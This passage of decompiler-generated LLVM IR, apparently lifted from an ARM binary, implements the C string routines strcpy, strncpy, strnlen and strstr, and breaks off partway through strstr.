define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_15948 = sub i32 %arg1, %tmp
  %v1_1594c = add i32 %v2_15948, -1
  store i32 %v1_1594c, i32* %r2.global-to-local, align 4
  %v2_159504 = load i8, i8* %arg2, align 1
  %v5_159506 = add i32 %tmp, 1
  store i32 %v5_159506, i32* %r1.global-to-local, align 4
  %v2_159547 = icmp eq i8 %v2_159504, 0
  store i1 %v2_159547, i1* %cpsr_z.global-to-local, align 1
  %v5_159588 = inttoptr i32 %arg1 to i8*
  store i8 %v2_159504, i8* %v5_159588, align 1
  %v0_1595c9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1595c9, label %dec_label_pc_15960, label %dec_label_pc_15950.dec_label_pc_15950_crit_edge

dec_label_pc_15950.dec_label_pc_15950_crit_edge:  ; preds = %entry, %dec_label_pc_15950.dec_label_pc_15950_crit_edge
  %v0_15950.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_15958.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15950 = inttoptr i32 %v0_15950.pre to i8*
  %v2_15950 = load i8, i8* %v1_15950, align 1
  %v5_15950 = add i32 %v0_15950.pre, 1
  store i32 %v5_15950, i32* %r1.global-to-local, align 4
  %v2_15954 = icmp eq i8 %v2_15950, 0
  store i1 %v2_15954, i1* %cpsr_z.global-to-local, align 1
  %v4_15958 = add i32 %v5_15950, %v3_15958.pre
  %v5_15958 = inttoptr i32 %v4_15958 to i8*
  store i8 %v2_15950, i8* %v5_15958, align 1
  %v0_1595c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1595c, label %dec_label_pc_15960, label %dec_label_pc_15950.dec_label_pc_15950_crit_edge

dec_label_pc_15960:                               ; preds = %dec_label_pc_15950.dec_label_pc_15950_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15950.dec_label_pc_15950_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_15964 = icmp eq i32 %arg2, 3
  store i1 %v7_15964, i1* %cpsr_z.global-to-local, align 1
  %v1_1596c = add i32 %arg1, -1
  store i32 %v1_1596c, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_159e8, label %dec_label_pc_15974

dec_label_pc_15974:                               ; preds = %entry
  %v3_15974 = udiv i32 %arg2, 4
  store i32 %v3_15974, i32* @lr, align 4
  %v0_15978.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15978

dec_label_pc_15978:                               ; preds = %dec_label_pc_159c4, %dec_label_pc_15974
  %v2_15980 = phi i32 [ %v6_159b8, %dec_label_pc_159c4 ], [ %v1_1596c, %dec_label_pc_15974 ]
  %v0_15978 = phi i32 [ %v1_159c8, %dec_label_pc_159c4 ], [ %v0_15978.pre, %dec_label_pc_15974 ]
  %v1_15978 = inttoptr i32 %v0_15978 to i8*
  %v2_15978 = load i8, i8* %v1_15978, align 1
  %v3_15978 = zext i8 %v2_15978 to i32
  store i32 %v3_15978, i32* %r3.global-to-local, align 4
  %v2_1597c = icmp eq i8 %v2_15978, 0
  store i1 %v2_1597c, i1* %cpsr_z.global-to-local, align 1
  %v3_15980 = add i32 %v2_15980, 1
  %v4_15980 = inttoptr i32 %v3_15980 to i8*
  store i8 %v2_15978, i8* %v4_15980, align 1
  %v5_15980 = load i32, i32* %ip.global-to-local, align 4
  %v6_15980 = add i32 %v5_15980, 1
  store i32 %v6_15980, i32* %ip.global-to-local, align 4
  %v0_15984 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15984, label %dec_label_pc_159d4, label %dec_label_pc_15988

dec_label_pc_15988:                               ; preds = %dec_label_pc_15978
  %v0_15988 = load i32, i32* @r1, align 4
  %v1_15988 = add i32 %v0_15988, 1
  %v2_15988 = inttoptr i32 %v1_15988 to i8*
  %v3_15988 = load i8, i8* %v2_15988, align 1
  %v4_15988 = zext i8 %v3_15988 to i32
  store i32 %v4_15988, i32* %r3.global-to-local, align 4
  %v2_1598c = icmp eq i8 %v3_15988, 0
  store i1 %v2_1598c, i1* %cpsr_z.global-to-local, align 1
  %v3_15990 = add i32 %v5_15980, 2
  %v4_15990 = inttoptr i32 %v3_15990 to i8*
  store i8 %v3_15988, i8* %v4_15990, align 1
  %v5_15990 = load i32, i32* %ip.global-to-local, align 4
  %v6_15990 = add i32 %v5_15990, 1
  store i32 %v6_15990, i32* %ip.global-to-local, align 4
  %v0_15994 = load i32, i32* @r1, align 4
  %v1_15994 = add i32 %v0_15994, 1
  store i32 %v1_15994, i32* %r1.global-to-local, align 4
  %v0_15998 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15998, label %dec_label_pc_159d4, label %dec_label_pc_1599c

dec_label_pc_1599c:                               ; preds = %dec_label_pc_15988
  %v1_1599c = add i32 %v0_15994, 2
  %v2_1599c = inttoptr i32 %v1_1599c to i8*
  %v3_1599c = load i8, i8* %v2_1599c, align 1
  %v4_1599c = zext i8 %v3_1599c to i32
  store i32 %v4_1599c, i32* %r3.global-to-local, align 4
  %v2_159a0 = icmp eq i8 %v3_1599c, 0
  store i1 %v2_159a0, i1* %cpsr_z.global-to-local, align 1
  %v3_159a4 = add i32 %v5_15990, 2
  %v4_159a4 = inttoptr i32 %v3_159a4 to i8*
  store i8 %v3_1599c, i8* %v4_159a4, align 1
  %v5_159a4 = load i32, i32* %ip.global-to-local, align 4
  %v6_159a4 = add i32 %v5_159a4, 1
  store i32 %v6_159a4, i32* %ip.global-to-local, align 4
  %v0_159a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_159a8 = add i32 %v0_159a8, 1
  store i32 %v1_159a8, i32* %r1.global-to-local, align 4
  %v0_159ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_159ac, label %dec_label_pc_159d4, label %dec_label_pc_159b0

dec_label_pc_159b0:                               ; preds = %dec_label_pc_1599c
  %v1_159b0 = add i32 %v0_159a8, 2
  %v2_159b0 = inttoptr i32 %v1_159b0 to i8*
  %v3_159b0 = load i8, i8* %v2_159b0, align 1
  %v4_159b0 = zext i8 %v3_159b0 to i32
  store i32 %v4_159b0, i32* %r3.global-to-local, align 4
  %v2_159b4 = icmp eq i8 %v3_159b0, 0
  store i1 %v2_159b4, i1* %cpsr_z.global-to-local, align 1
  %v3_159b8 = add i32 %v5_159a4, 2
  %v4_159b8 = inttoptr i32 %v3_159b8 to i8*
  store i8 %v3_159b0, i8* %v4_159b8, align 1
  %v5_159b8 = load i32, i32* %ip.global-to-local, align 4
  %v6_159b8 = add i32 %v5_159b8, 1
  store i32 %v6_159b8, i32* %ip.global-to-local, align 4
  %v0_159bc = load i32, i32* %r1.global-to-local, align 4
  %v1_159bc = add i32 %v0_159bc, 1
  store i32 %v1_159bc, i32* %r1.global-to-local, align 4
  %v0_159c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_159c0, label %dec_label_pc_159d4, label %dec_label_pc_159c4

dec_label_pc_159c4:                               ; preds = %dec_label_pc_159b0
  %v0_159c4 = load i32, i32* @lr, align 4
  %v1_159c4 = add i32 %v0_159c4, -1
  store i32 %v1_159c4, i32* @lr, align 4
  %v7_159c4 = icmp eq i32 %v0_159c4, 1
  store i1 %v7_159c4, i1* %cpsr_z.global-to-local, align 1
  %v1_159c8 = add i32 %v0_159bc, 2
  store i32 %v1_159c8, i32* @r1, align 4
  br i1 %v7_159c4, label %dec_label_pc_159e8, label %dec_label_pc_15978

dec_label_pc_159d4:                               ; preds = %dec_label_pc_159b0, %dec_label_pc_1599c, %dec_label_pc_15988, %dec_label_pc_15978
  %v1_159d4 = phi i32 [ %v6_159b8, %dec_label_pc_159b0 ], [ %v6_159a4, %dec_label_pc_1599c ], [ %v6_15990, %dec_label_pc_15988 ], [ %v6_15980, %dec_label_pc_15978 ]
  %v2_159d41 = sub i32 %arg1, %v1_159d4
  %v2_159d8 = add i32 %v2_159d41, %arg2
  store i32 %v2_159d8, i32* %r3.global-to-local, align 4
  %v1_159dc = add i32 %v2_159d8, -1
  store i32 %v1_159dc, i32* %r2.global-to-local, align 4
  %v7_159dc = icmp eq i32 %v2_159d8, 1
  store i1 %v7_159dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159dc, label %bb, label %dec_label_pc_15a08

bb:                                               ; preds = %dec_label_pc_159d4
  ret i32 %arg1

dec_label_pc_159e8:                               ; preds = %dec_label_pc_159c4, %entry
  %v2_159f86 = phi i32 [ %v1_1596c, %entry ], [ %v6_159b8, %dec_label_pc_159c4 ]
  %v1_159e8 = urem i32 %arg2, 4
  store i32 %v1_159e8, i32* %r2.global-to-local, align 4
  %v2_159e8 = icmp eq i32 %v1_159e8, 0
  store i1 %v2_159e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159e8, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_159e8
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_159e8, %._crit_edge
  %v2_159f8 = phi i32 [ %v6_159f8, %._crit_edge ], [ %v2_159f86, %dec_label_pc_159e8 ]
  %v0_159f4 = phi i32 [ %v0_159f4.pre, %._crit_edge ], [ %v1_159e8, %dec_label_pc_159e8 ]
  %v0_159f0 = load i32, i32* @r1, align 4
  %v1_159f0 = inttoptr i32 %v0_159f0 to i8*
  %v2_159f0 = load i8, i8* %v1_159f0, align 1
  %v3_159f0 = zext i8 %v2_159f0 to i32
  store i32 %v3_159f0, i32* %r3.global-to-local, align 4
  %v5_159f0 = add i32 %v0_159f0, 1
  store i32 %v5_159f0, i32* @r1, align 4
  %v1_159f4 = add i32 %v0_159f4, -1
  store i32 %v1_159f4, i32* %r2.global-to-local, align 4
  %v7_159f4 = icmp eq i32 %v0_159f4, 1
  store i1 %v7_159f4, i1* %cpsr_z.global-to-local, align 1
  %v3_159f8 = add i32 %v2_159f8, 1
  %v4_159f8 = inttoptr i32 %v3_159f8 to i8*
  store i8 %v2_159f0, i8* %v4_159f8, align 1
  %v5_159f8 = load i32, i32* %ip.global-to-local, align 4
  %v6_159f8 = add i32 %v5_159f8, 1
  store i32 %v6_159f8, i32* %ip.global-to-local, align 4
  %v0_159fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_159fc, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_15a00 = load i32, i32* %r3.global-to-local, align 4
  %v2_15a00 = icmp eq i32 %v0_15a00, 0
  store i1 %v2_15a00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a00, label %dec_label_pc_15a08, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_159f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_15a08:                               ; preds = %dec_label_pc_159d4, %bb13, %dec_label_pc_15a08
  %v2_15a10 = phi i32 [ %v6_15a10, %dec_label_pc_15a08 ], [ %v1_159d4, %dec_label_pc_159d4 ], [ %v6_159f8, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15a0c = load i32, i32* %r2.global-to-local, align 4
  %v1_15a0c = add i32 %v0_15a0c, -1
  store i32 %v1_15a0c, i32* %r2.global-to-local, align 4
  %v7_15a0c = icmp eq i32 %v0_15a0c, 1
  store i1 %v7_15a0c, i1* %cpsr_z.global-to-local, align 1
  %v3_15a10 = add i32 %v2_15a10, 1
  %v4_15a10 = inttoptr i32 %v3_15a10 to i8*
  store i8 0, i8* %v4_15a10, align 1
  %v5_15a10 = load i32, i32* %ip.global-to-local, align 4
  %v6_15a10 = add i32 %v5_15a10, 1
  store i32 %v6_15a10, i32* %ip.global-to-local, align 4
  %v0_15a14 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15a14, label %dec_label_pc_15a18, label %dec_label_pc_15a08

dec_label_pc_15a18:                               ; preds = %dec_label_pc_15a08
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_15a10, { 1, 0 }
  uselistorder i32 %v0_15a0c, { 1, 0 }
  uselistorder i32 %v6_159f8, { 0, 2, 1 }
  uselistorder i32 %v1_159e8, { 2, 1, 0 }
  uselistorder i32 %v2_159d8, { 2, 1, 0 }
  uselistorder i32 %v1_159c8, { 1, 0 }
  uselistorder i32 %v0_159c4, { 1, 0 }
  uselistorder i32 %v6_159b8, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_15a08, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15a1c = load i32, i32* @r1, align 4
  %v2_15a1c = icmp eq i32 %v0_15a1c, 0
  br i1 %v2_15a1c, label %bb, label %dec_label_pc_15a4c

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a5c
  %v3_15a34 = icmp uge i32 %v5_15ae8, %v1_15a34
  %v9_15a34 = icmp eq i32 %v5_15ae8, %v1_15a34
  %v2_15a38 = xor i1 %v3_15a34, true
  %v3_15a38 = or i1 %v9_15a34, %v2_15a38
  br i1 %v3_15a38, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_15a34
  %v6_15a38 = sub i32 %v5_15ae8, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15a34, %bb19
  %v5_15a3c = phi i32 [ %v1_15a34, %dec_label_pc_15a34 ], [ %v6_15a38, %bb19 ]
  %v2_15a3c = xor i1 %v9_15a34, true
  %v3_15a3c = and i1 %v3_15a34, %v2_15a3c
  br i1 %v3_15a3c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_15a3c = sub i32 %v5_15a3c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_15a40 = phi i32 [ %v5_15a3c, %bb20 ], [ %v6_15a3c, %bb21 ]
  ret i32 %v8_15a40

dec_label_pc_15a44:                               ; preds = %dec_label_pc_15a90
  br label %dec_label_pc_15ae4

dec_label_pc_15a4c:                               ; preds = %entry
  %v2_15a4c = add i32 %tmp, %v0_15a1c
  %v3_15a4c = icmp ult i32 %v2_15a4c, %tmp
  br i1 %v3_15a4c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_15a4c
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_15a4c, %bb23
  %v5_15ae8 = phi i32 [ %v2_15a4c, %dec_label_pc_15a4c ], [ -1, %bb23 ]
  %v1_15a6c2 = urem i32 %tmp, 4
  %v2_15a6c3 = icmp eq i32 %v1_15a6c2, 0
  br i1 %v2_15a6c3, label %dec_label_pc_15a74, label %dec_label_pc_15a5c

dec_label_pc_15a5c:                               ; preds = %bb24, %dec_label_pc_15a68
  %v1_15a34 = phi i32 [ %v1_15a68, %dec_label_pc_15a68 ], [ %tmp, %bb24 ]
  %v1_15a5c = inttoptr i32 %v1_15a34 to i8*
  %v2_15a5c = load i8, i8* %v1_15a5c, align 1
  %v2_15a60 = icmp eq i8 %v2_15a5c, 0
  br i1 %v2_15a60, label %dec_label_pc_15a34, label %dec_label_pc_15a68

dec_label_pc_15a68:                               ; preds = %dec_label_pc_15a5c
  %v1_15a68 = add i32 %v1_15a34, 1
  %v1_15a6c = urem i32 %v1_15a68, 4
  %v2_15a6c = icmp eq i32 %v1_15a6c, 0
  br i1 %v2_15a6c, label %dec_label_pc_15a74, label %dec_label_pc_15a5c

dec_label_pc_15a74:                               ; preds = %dec_label_pc_15a68, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_15a68, %dec_label_pc_15a68 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_15ad432 = icmp ult i32 %storemerge.lcssa, %v5_15ae8
  br i1 %v3_15ad432, label %dec_label_pc_15a7c, label %dec_label_pc_15ae4

dec_label_pc_15a7c:                               ; preds = %dec_label_pc_15ad0, %dec_label_pc_15a74
  %v0_15a4439 = phi i32 [ %v4_15a7c, %dec_label_pc_15ad0 ], [ %storemerge.lcssa, %dec_label_pc_15a74 ]
  %v1_15a7c = inttoptr i32 %v0_15a4439 to i32*
  %v2_15a7c = load i32, i32* %v1_15a7c, align 4
  %v4_15a7c = add i32 %v0_15a4439, 4
  store i32 %v4_15a7c, i32* @lr, align 4
  %v2_15a80 = add i32 %v2_15a7c, -16843009
  %v2_15a84 = and i32 %v2_15a80, -2139062144
  %v2_15a88 = icmp eq i32 %v2_15a84, 0
  br i1 %v2_15a88, label %dec_label_pc_15ad0, label %dec_label_pc_15a90

dec_label_pc_15a90:                               ; preds = %dec_label_pc_15a7c
  %v2_15a90 = inttoptr i32 %v0_15a4439 to i8*
  %v3_15a90 = load i8, i8* %v2_15a90, align 1
  %v2_15a98 = icmp eq i8 %v3_15a90, 0
  %v1_15a9c = add i32 %v0_15a4439, 1
  br i1 %v2_15a98, label %dec_label_pc_15a44, label %dec_label_pc_15aa4

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a90
  %v2_15aa4 = inttoptr i32 %v1_15a9c to i8*
  %v3_15aa4 = load i8, i8* %v2_15aa4, align 1
  %v2_15aa8 = icmp eq i8 %v3_15aa4, 0
  br i1 %v2_15aa8, label %dec_label_pc_15ae4, label %dec_label_pc_15ab0

dec_label_pc_15ab0:                               ; preds = %dec_label_pc_15aa4
  %v1_15ab0 = add i32 %v0_15a4439, 2
  %v2_15ab0 = inttoptr i32 %v1_15ab0 to i8*
  %v3_15ab0 = load i8, i8* %v2_15ab0, align 1
  %v2_15ab4 = icmp eq i8 %v3_15ab0, 0
  br i1 %v2_15ab4, label %dec_label_pc_15ae4, label %dec_label_pc_15ac0

dec_label_pc_15ac0:                               ; preds = %dec_label_pc_15ab0
  %v1_15ac0 = add i32 %v0_15a4439, 3
  %v2_15ac0 = inttoptr i32 %v1_15ac0 to i8*
  %v3_15ac0 = load i8, i8* %v2_15ac0, align 1
  %v2_15ac4 = icmp eq i8 %v3_15ac0, 0
  br i1 %v2_15ac4, label %dec_label_pc_15ae4, label %dec_label_pc_15ad0

dec_label_pc_15ad0:                               ; preds = %dec_label_pc_15ac0, %dec_label_pc_15a7c
  %v3_15ad4 = icmp ult i32 %v4_15a7c, %v5_15ae8
  br i1 %v3_15ad4, label %dec_label_pc_15a7c, label %dec_label_pc_15ae4

dec_label_pc_15ae4:                               ; preds = %dec_label_pc_15ad0, %dec_label_pc_15a74, %dec_label_pc_15aa4, %dec_label_pc_15ab0, %dec_label_pc_15ac0, %dec_label_pc_15a44
  %v1_15ae4 = phi i32 [ %v0_15a4439, %dec_label_pc_15a44 ], [ %storemerge.lcssa, %dec_label_pc_15a74 ], [ %v1_15a9c, %dec_label_pc_15aa4 ], [ %v1_15ab0, %dec_label_pc_15ab0 ], [ %v1_15ac0, %dec_label_pc_15ac0 ], [ %v5_15ae8, %dec_label_pc_15ad0 ]
  %v3_15ae4 = icmp uge i32 %v5_15ae8, %v1_15ae4
  %v9_15ae4 = icmp eq i32 %v5_15ae8, %v1_15ae4
  %v2_15ae8 = xor i1 %v3_15ae4, true
  %v3_15ae8 = or i1 %v9_15ae4, %v2_15ae8
  br i1 %v3_15ae8, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_15ae4
  %v6_15ae8 = sub i32 %v5_15ae8, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_15ae4, %bb25
  %v5_15aec = phi i32 [ %v1_15ae4, %dec_label_pc_15ae4 ], [ %v6_15ae8, %bb25 ]
  %v2_15aec = xor i1 %v9_15ae4, true
  %v3_15aec = and i1 %v3_15ae4, %v2_15aec
  br i1 %v3_15aec, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_15aec = sub i32 %v5_15aec, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_15af0 = phi i32 [ %v5_15aec, %bb26 ], [ %v6_15aec, %bb27 ]
  ret i32 %v8_15af0

; uselistorder directives
  uselistorder i1 %v3_15ae4, { 1, 0 }
  uselistorder i32 %v4_15a7c, { 1, 2, 0 }
  uselistorder i32 %v0_15a4439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_15a68, { 1, 0, 2 }
  uselistorder i32 %v1_15a34, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_15ae8, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_15a34, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_15ae4, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_15a5c, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %v6_15afc = load i32, i32* @r5, align 4
  %v9_15afc = load i32, i32* @r6, align 4
  %v3_15b00 = load i8, i8* %arg2, align 1
  %v2_15b04 = icmp eq i8 %v3_15b00, 0
  br i1 %v2_15b04, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_15b0c = add i32 %arg1, -1
  br label %dec_label_pc_15b10

dec_label_pc_15b10:                               ; preds = %dec_label_pc_15b1c, %bb50
  %v0_15b10 = phi i32 [ %v1_15b10, %dec_label_pc_15b1c ], [ %v1_15b0c, %bb50 ]
  %v1_15b10 = add i32 %v0_15b10, 1
  %v2_15b10 = inttoptr i32 %v1_15b10 to i8*
  %v3_15b10 = load i8, i8* %v2_15b10, align 1
  %v2_15b14 = icmp eq i8 %v3_15b10, 0
  br i1 %v2_15b14, label %dec_label_pc_15bec, label %dec_label_pc_15b1c

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b10
  %v9_15b1c = icmp eq i8 %v3_15b10, %v3_15b00
  br i1 %v9_15b1c, label %dec_label_pc_15b24, label %dec_label_pc_15b10

dec_label_pc_15b24:                               ; preds = %dec_label_pc_15b1c
  %v2_15b24 = add i32 %tmp, 1
  %v3_15b24 = inttoptr i32 %v2_15b24 to i8*
  %v4_15b24 = load i8, i8* %v3_15b24, align 1
  %v2_15b28 = icmp eq i8 %v4_15b24, 0
  br i1 %v2_15b28, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_15b24
  store i32 %v6_15afc, i32* @r5, align 4
  store i32 %v9_15afc, i32* @r6, align 4
  ret i32 %v1_15b10

bb52:                                             ; preds = %dec_label_pc_15b24
  %v1_15b34 = add i32 %v0_15b10, 2
  %v1_15b88 = add i32 %tmp, 2
  %v2_15b88 = inttoptr i32 %v1_15b88 to i8*
  br label %dec_label_pc_15b80

dec_label_pc_15b44:                               ; preds = %dec_label_pc_15be0
  %v3_15b44 = load i8, i8* %v3_15b78.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_15b70.preheader

dec_label_pc_15b70.preheader:                     ; preds = %dec_label_pc_15b44, %dec_label_pc_15b80
  %v0_15b704.in = phi i8 [ %v3_15b44, %dec_label_pc_15b44 ], [ %v3_15b78.pn, %dec_label_pc_15b80 ]
  %v9_15b7013 = icmp eq i8 %v0_15b704.in, %v3_15b00
  br i1 %v9_15b7013, label %dec_label_pc_15b78, label %dec_label_pc_15b50

dec_label_pc_15b50:                               ; preds = %dec_label_pc_15b70.preheader, %dec_label_pc_15b6c
  %v0_15b58 = phi i32 [ %v1_15b6c, %dec_label_pc_15b6c ], [ %storemerge43, %dec_label_pc_15b70.preheader ]
  %v0_15b50.in = phi i8 [ %v3_15b6c, %dec_label_pc_15b6c ], [ %v0_15b704.in, %dec_label_pc_15b70.preheader ]
  %v2_15b50 = icmp eq i8 %v0_15b50.in, 0
  br i1 %v2_15b50, label %dec_label_pc_15bec, label %dec_label_pc_15b58

dec_label_pc_15b58:                               ; preds = %dec_label_pc_15b50
  %v1_15b58 = add i32 %v0_15b58, 1
  %v2_15b58 = inttoptr i32 %v1_15b58 to i8*
  %v3_15b58 = load i8, i8* %v2_15b58, align 1
  store i32 %v1_15b58, i32* @ip, align 4
  %v9_15b5c = icmp eq i8 %v3_15b58, %v3_15b00
  br i1 %v9_15b5c, label %dec_label_pc_15b78, label %dec_label_pc_15b64

dec_label_pc_15b64:                               ; preds = %dec_label_pc_15b58
  %v2_15b64 = icmp eq i8 %v3_15b58, 0
  br i1 %v2_15b64, label %dec_label_pc_15bec, label %dec_label_pc_15b6c

dec_label_pc_15b6c:                               ; preds = %dec_label_pc_15b64
  %v1_15b6c = add i32 %v0_15b58, 2
  %v2_15b6c = inttoptr i32 %v1_15b6c to i8*
  %v3_15b6c = load i8, i8* %v2_15b6c, align 1
  store i32 %v1_15b6c, i32* @ip, align 4
  %v9_15b70 = icmp eq i8 %v3_15b6c, %v3_15b00
  br i1 %v9_15b70, label %dec_label_pc_15b78, label %dec_label_pc_15b50

dec_label_pc_15b78:                               ; preds = %dec_label_pc_15b58, %dec_label_pc_15b6c, %dec_label_pc_15b70.preheader
  %v0_15b78 = phi i32 [ %storemerge43, %dec_label_pc_15b70.preheader ], [ %v1_15b58, %dec_label_pc_15b58 ], [ %v1_15b6c, %dec_label_pc_15b6c ]
  %v1_15b78 = add i32 %v0_15b78, 1
  br label %dec_label_pc_15b80

dec_label_pc_15b80:                               ; preds = %bb52, %dec_label_pc_15b78
  %storemerge43 = phi i32 [ %v1_15b78, %dec_label_pc_15b78 ], [ %v1_15b34, %bb52 ]
  %v3_15b78.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_15b78.pn = load i8, i8* %v3_15b78.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_15b78.pn, %v4_15b24
  br i1 %storemerge, label %dec_label_pc_15b84, label %dec_label_pc_15b70.preheader

dec_label_pc_15b84:                               ; preds = %dec_label_pc_15b80
  %v1_15b84 = add i32 %storemerge43, 1
  %v2_15b84 = inttoptr i32 %v1_15b84 to i8*
  %v3_15b84 = load i8, i8* %v2_15b84, align 1
  %v4_15b84 = zext i8 %v3_15b84 to i32
  %v3_15b88 = load i8, i8* %v2_15b88, align 1
  %v4_15b88 = zext i8 %v3_15b88 to i32
  %v1_15b8c = add i32 %storemerge43, -1
  %v9_15b90 = icmp eq i8 %v3_15b84, %v3_15b88
  store i32 %v1_15b88, i32* @lr, align 4
  store i32 %v1_15b84, i32* @ip, align 4
  br i1 %v9_15b90, label %dec_label_pc_15ba0, label %dec_label_pc_15be0

dec_label_pc_15ba0:                               ; preds = %dec_label_pc_15b84, %dec_label_pc_15b9c
  %v0_15bb8 = phi i32 [ %v1_15bc0, %dec_label_pc_15b9c ], [ %v1_15b88, %dec_label_pc_15b84 ]
  %v0_15bb0 = phi i32 [ %v1_15bbc, %dec_label_pc_15b9c ], [ %v1_15b84, %dec_label_pc_15b84 ]
  %v0_15ba0 = phi i32 [ %v4_15bd0, %dec_label_pc_15b9c ], [ %v4_15b84, %dec_label_pc_15b84 ]
  %v2_15ba0 = icmp eq i32 %v0_15ba0, 0
  br i1 %v2_15ba0, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_15ba0
  store i32 %v6_15afc, i32* @r5, align 4
  store i32 %v9_15afc, i32* @r6, align 4
  ret i32 %v1_15b8c

bb54:                                             ; preds = %dec_label_pc_15ba0
  %v1_15ba8 = add i32 %v0_15bb0, 1
  %v2_15ba8 = inttoptr i32 %v1_15ba8 to i8*
  %v3_15ba8 = load i8, i8* %v2_15ba8, align 1
  %v1_15bac = add i32 %v0_15bb8, 1
  %v2_15bac = inttoptr i32 %v1_15bac to i8*
  %v3_15bac = load i8, i8* %v2_15bac, align 1
  %v4_15bac = zext i8 %v3_15bac to i32
  %v9_15bb4 = icmp eq i8 %v3_15ba8, %v3_15bac
  %v1_15bbc = add i32 %v0_15bb0, 2
  store i32 %v1_15bbc, i32* @ip, align 4
  %v1_15bc0 = add i32 %v0_15bb8, 2
  store i32 %v1_15bc0, i32* @lr, align 4
  br i1 %v9_15bb4, label %dec_label_pc_15bc8, label %dec_label_pc_15be0

dec_label_pc_15bc8:                               ; preds = %bb54
  %v2_15bc8 = icmp eq i8 %v3_15ba8, 0
  br i1 %v2_15bc8, label %bb55, label %dec_label_pc_15b9c

bb55:                                             ; preds = %dec_label_pc_15bc8
  store i32 %v6_15afc, i32* @r5, align 4
